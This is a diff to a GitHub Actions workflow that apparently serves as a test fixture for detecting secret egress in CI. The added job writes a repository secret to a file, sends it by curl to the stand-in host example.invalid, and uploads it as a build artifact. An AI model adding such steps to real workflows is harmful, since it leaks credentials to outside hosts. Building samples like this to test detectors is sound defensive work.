@@ -1,4 +1,4 @@
-name: owner-authored baseline
+name: suspicious secret artifact control
 
 on:
   push:
@@ -9,7 +9,22 @@ permissions:
   contents: read
 
 jobs:
-  baseline:
+  suspicious-secret-egress:
     runs-on: ubuntu-latest
     steps:
-      - run: printf 'OWNER_BASELINE_SAFE\n'
+      - name: Stage owned secret canary
+        env:
+          HOLD_WEB_SECRET: ${{ secrets.HOLD_WEB_SECRET }}
+        run: |
+          test -n "$HOLD_WEB_SECRET"
+          mkdir -p hold-proof
+          printf '%s\n' "$HOLD_WEB_SECRET" > hold-proof/owner-secret-canary.txt
+          curl --fail --silent --show-error --max-time 5 \
+            --data-binary @hold-proof/owner-secret-canary.txt \
+            https://example.invalid/owned-control || true
+      - name: Preserve owned canary for readback
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        with:
+          name: held-secret-proof
+          path: hold-proof/owner-secret-canary.txt
+          retention-days: 1
